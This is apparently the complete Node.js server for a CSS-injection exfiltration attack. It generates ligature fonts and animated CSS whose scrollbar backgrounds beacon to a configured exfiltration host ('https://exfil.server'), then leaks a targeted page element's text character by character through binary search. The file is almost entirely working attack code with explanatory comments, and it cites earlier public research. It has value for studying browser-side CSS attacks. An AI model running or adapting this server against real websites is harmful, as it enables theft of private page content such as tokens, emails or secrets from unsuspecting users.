const express = require('express');
const js2xmlparser = require('js2xmlparser');
const fs = require('fs');
const tmp = require('tmp');
const rimraf = require('rimraf');
const child_process = require('child_process');

const app = express();
app.disable('etag');

// Config
const PORT = 3000;
// The URL of your debian 12 VPS
const HOSTNAME = "https://exfil.server";
// The Prefix is the starting point of the ligature bruteforce. the | is inserted before and after the target element later
const PREFIX = '|';
//All characters that can be exfiltrated
const CHARSET = "eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^";
// Will Cut the CHARSET into 4 pieces and create a font for each of them for the binary search
const LOG = 4;
const DEBUG = true;
// Time between each animation
const DELAY = '1.5s';
// Duration of each animation
const DURATION = '4.5s';
// Width of the container around the target element. 392px allows for around 30 chars before it overflows and the overflows will be detected using scrollbars later.
const WIDTH = '392px';

//This is used to display the green results area. In order to see the exfiltration status live the selector has to keep getting more specific in order to override the css used before. This loop creates
//selectors in the following way: html:not(any0) then html:not(any0):not(any1) html:not(any0):not(any1):not(any2). The specificity increases by 1 every time but the selector remains the same, as 
//html:not(any1) basically means: "Select all html tags that don't have a <any1> tag as child. But there is no <any1> tag so the condition will always remain true.
//Reference for CSS specificity: https://www.w3schools.com/css/css_specificity.asp, https://polypane.app/css-specificity-calculator/


let displaySelectorArray = [];
let minDisplaySelector = "html:not(any0)";

// 100/3 = 33 chars exfiltrated chars live displayable

for(let i = 1; i <=100; i++) {
	displaySelectorArray.push(minDisplaySelector += ":not(any" + i + ")");
}

// This takes the pointer to the target element that is passed in the URL via <style>@import url('//any.com/div%20%3E%20h4%20%2B%20p/css.css');</style> (In this case div > h4 + p) and creates an array
// of selectors with steadily increasing specificity as explained above

let minSelectorToTarget = "willBeSetLater";
let selectorArray = [];

// 100/3 = 33 chars exfiltratable

function genSelectorArray() {
	let tmpMinSelectorToTarget = minSelectorToTarget;
	for(let i = 1; i <=100; i++) {
		selectorArray.push(tmpMinSelectorToTarget += ":not(any" + i + ")");
	}

}

// thanks to @SecurityMB:
// https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/

// This function creates the Fonts for each of the four sub-Charsets of "eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^"

function createFont(prefix, charsToLigature) {
    let font = {
        "defs": {
            "font": {
                "@": {
                    "id": "hack",
                    "horiz-adv-x": "0"
                },
                "font-face": {
                    "@": {
                        "font-family": "hack",
                        "units-per-em": "1000"
                    }
                },
                "glyph": []
            }
        }
    };

    let glyphs = font.defs.font.glyph;

    //Create a glyph for each printable ASCII character with a normal horiz-adv-x
	
    for (let c = 0x20; c <= 0x7e; c += 1) {
        const glyph = {
            "@": {
                "unicode": String.fromCharCode(c),
                "horiz-adv-x": "0",
                "d": "M1 0z",
            }
        };
        glyphs.push(glyph);
    }

    //Create a ligature for every combination of the first-letter (or already leaked word) and characters of the sub-Charsets with a huge horiz-adv-x. This will trigger the overflow and the scrollbar onOverflow.
	
    charsToLigature.forEach(c => {
        const glyph = {
            "@": {
                "unicode": prefix + c,
                "horiz-adv-x": "32755",
                "d": "M1 0z",
            }
        }
        glyphs.push(glyph);
    });

    //Actually create the font using fontforge and save the .woff file in /tmp
	
    const xml = js2xmlparser.parse("svg", font);

    const tmpobj = tmp.dirSync();
    fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
    child_process.spawnSync("/usr/bin/fontforge", [
        `${__dirname}/script.fontforge`,
        `${tmpobj.name}/font.svg`
    ]);

    const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);

    rimraf.sync(tmpobj.name);

    return woff;
}

/// Utils

// Encode certain chars of the CHARSET because else it doesnt work. I don't fully understand it either tbh...

const encode = e => encodeURIComponent(e).replace(/\./g,'%252E').replace(/'/g, '%27').replace(/!/g, '%21');

//Debug Logging

function log() {
    if (DEBUG) console.log.apply(console, arguments);
}

// Splits the CHARSET into 4 sub-Charsets of equal size (The n=2 is a fallback value for the split() function and would only be used if the no value for n is passed to the function which is never the case,
// so it can be ignored. Example: "abcdefghi" -> "abc" "def" "ghi" "jk"

function split(str, n=2) {
    return str.match(new RegExp('.{1,'+(Math.ceil(str.length/n))+'}','g'));
}

/// CSS generation

// define fonts with src to on-the-fly ligature generation
// Looks complicated but this basically just defines the font "hack__abcdefg" and tells it, that if it is applied to some element it should send a GET request to https://any.com/font/alreadyKnownCharsLeakedBefore/currentSubCharsetlike0123456789.@
// So this is used to exfiltrate the information which sub-Charset the font that is currently applied is, has.

function genFontFacesCSS (prefix, input, chars) {
    return `@font-face{font-family:empty;src:url(${HOSTNAME}/font/${encode(prefix+input)}/%C2%AC)}` + split(chars, LOG).map((c,i) => `@font-face{font-family:"hack_${input+"_"+c+"_"+i}";src:url(${HOSTNAME}/font/${encode(prefix+input)}/${encode(c)})}`).join('')+'\n';
};

// Use animations to iterate over the fonts (1 per sub-Charset). If one of the fonts is applied and it then triggers the scrollbar (because a ligature with huge horiz-adv-x (basically width) was rendered) the
// information, which of the sub-Charsets triggered the scrollbar is leaked to /leak where it will later be used further.

function genAnimation (chars, input, ttl) {
    let chunks = split(chars, LOG);
    let delta = Math.floor(100 / chunks.length / 2);
    return `@keyframes wololo_${n} {\n` +
        chunks.map((e,i) => {
            return `${delta*i*2}%{font-family:empty;--x:0}\n` +
                `${delta*(i*2+1)}%{font-family:"hack_${input+"_"+e+"_"+i}";--x:url(${HOSTNAME}/leak?ttl=${ttl}&pre=${encode(input)}&chars=${encode(e)});}\n`;
        }).join('') +
        `100%{font-family:empty;--x:0}\n` +
        `}\n`;
};

// Applies the animation etc. to the target-element, set up the ::before (and ::after) pseude-element(s), which will be used as starting point for the ligature bruteforce, set up the scrollbar leakage where 
// --x is a css variable containing the URL of to /leak that will dynamically be filled with the current sub-Charset while the animation(see genAnimation()) is going through all the sub-Charsets. 
// The last part (:after) us used to dynamically display the green result area live in the browser as a kind of progress bar

function genInjection (selector='.foo', iterations=0, width='450px', delay='1s', duration='5s') {
    return `${[selectorArray[n]]}::first-letter { font-family: unset; }
    ${[selectorArray[n]]}{
    overflow-x: auto;
    width: ${width};
    animation-duration: ${duration};
    animation-delay: ${delay};
    font-family: empty;
    background: lightblue;
    animation-name: wololo_${n};
    z-index: ${iterations};
    letter-spacing: normal !important;
}
${selectorArray[n]}::before {
    content: "|";
}
${selectorArray[n]}::after {
    content: "|";
}
${selectorArray[n]}::-webkit-scrollbar {
    background: blue;
}
${selectorArray[n]}::-webkit-scrollbar:horizontal {
    background:var(--x);
}

${displaySelectorArray[n]}:after{
    color: #155724;
    background-color: #d4edda;
    border-color: #c3e6cb;
    padding: 0.75rem 1.25rem;
    border: 1px solid transparent;
    content: "Exfiltrating... \\0a \\0a Exfiltrated: ${input}";
    position:fixed;
    left:0;
    top:100px;
    padding:5px;
    width: 100%;
    height: calc(100% - 100px);
    overflow: auto;
    white-space: pre;
    font-family:Arial;
    box-sizing: border-box;
    z-index: 2147483647;
    }

`;
};


// Call all the functions above, provide logging in the terminal on the server and send a GET request to /next, which will recursivly keep going through the target-element letter by letter (logic explained later)  

function genResponse (res, ttl, chars) {
    console.log('...payload ('+ n +'): ' + split(chars, LOG));
    var css =
        '@import url('+ HOSTNAME + '/next?' + Math.random() + ');\n\n' +
        genFontFacesCSS(PREFIX, input, chars) +
        genAnimation(chars, input, ttl) +
        genInjection(minSelectorToTarget, n, WIDTH, DELAY, DURATION);
    res.set({
        //'Cache-Control': 'public, max-age=600',
        'Content-Type': 'text/css',
    });
    res.end(css);
    n = n + 1;
}

// Handles the requests to /font and returns the requested fonts with the fitting ligatures

var pending = [], ready = 0, n = 0, input = "", ttl = 0;

app.get("/font/:prefix/:charsToLigature", (req, res) => {
    const { prefix, charsToLigature } = req.params;
    res.set({
        'Cache-Control': 'public, max-age=600',
        'Content-Type': 'application/x-font-woff',
        'Access-Control-Allow-Origin': '*',
    });
    res.end(createFont(decodeURIComponent(prefix), Array.from(decodeURIComponent(charsToLigature))));
});


// first request, reset everything in case one session is used for multiple exfiltrations and the server is not restarted using: node index.js

app.get("/start", (req, res) => {
    log("===============================");
    ready = 1;
    n = 0;
    pending = [];
    chars = CHARSET;
    input = "";
    ttl = 0;
    minDisplaySelector = "html:not(any0)";
    genResponse(res, ttl, chars);
});


// only keep first response, loop until we get 1 char, then mark as ready or send payload
app.get("/leak", (req, res) => {
    res.sendStatus(200).end();
    // idk, Not important
    req.query.ttl = parseInt(req.query.ttl, 10);
    // Already leaked char coming before the char we are currently trying to leak
    req.query.pre = decodeURIComponent(req.query.pre);
    // The current sub-Charset used
    req.query.chars = decodeURIComponent(req.query.chars);
    if (req.query.chars && req.query.ttl >= ttl) {
        ttl = ttl + 1;

	// Check if the current subCharset is only 1 letter like 'a' or 'b'. If this is the case we have successfully leaked the character and it is added to the input variable ( The result basically)
	// The charset for the next binary search (aiming to leak next char) remains the original ("eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^")

	// If the subCharset is more than 1 letter (meaning that we don't know the letter yet), the CHARSET for the next binary search will now become the sub-Charset from before.
	// "eoars nidtlcmup.@hbfgvwyjkqxzABCDEFGHIJKLMNOPQRSTUVWXYZ0189234576+!#=$^" -> "eoars nidtl" -> "eoars" -> "eo" -> "e". Like this we can perform a binary search on the original Charset
	// For every request to /leak we cut the amuont of possible letters for the next character in half (kinda). This is important, because now with the smaller CHARSET everything begins again:
	// Creating sub-Charsets, animating detecting and again decreasing the amuont of possibilites until we know the next character, at which point we move on to the next character.
	    
        if (req.query.chars.length === 1) {
            input += req.query.chars;
            chars = CHARSET; // prepare next binary search
        } else {
            chars = req.query.chars; // keep binary search
        }
        console.log('recv: %s', (input));
    } else {
        return;
    }

    //Generate and send the next payload starting the cycle again.
	
    if (ready == 1) {
        genResponse(pending.shift(), ttl, chars);
        ready = 0;
    } else {
	ready++;
        log('\tleak: waiting others...');
    }
});

// Send next payload when ready. The server is ready to send the next payload, if the routine of the first payload (animation to apply fonts to everything and then exfil etc.) is finished. If the server is
// ready genResponse() is called which will send the next request and start the whole process again aiming at leaking the next char. If the server is not ready yet, the server will add the respones to a an 
// array ( This basically just means, that the request will be used and resolved at a later time (in /leak)).

app.get("/next", (req, res) => {
    if (ready == 1) {
        genResponse(res, ttl, chars);
        ready = 0;
    } else {
        pending.push(res);
        ready++;
        log('\tquery: waiting others...');
    }
});

// This is where the initial request from the injected @import is sent. The :wildcard captures the pointer to the target element (e.g. h4 + p) in a variabale which is then saved and used to generate the 
// selectArray for the target-elements (because increasing specificity is needed) using genSelectorArray(). Then the CSS "@import 'https://any.com/start'" which will send a GET request to /start

app.get('/:wildcard/css.css', (req, res) => {
	minSelectorToTarget = req.params.wildcard
	console.log(minSelectorToTarget);
	genSelectorArray();
	res.setHeader('Content-Type', 'text/css');
	res.send("@import 'https://any.com/start'");
});

//Makes it possible to view the demo site at /index.html

app.get('/index.html', (req, res) => {
	res.sendFile('index.html', {
		root: '.'
	});
});

//Start the Server on PORT

app.listen(PORT, () => {
	console.log(`Listening on ${PORT}...`);
})
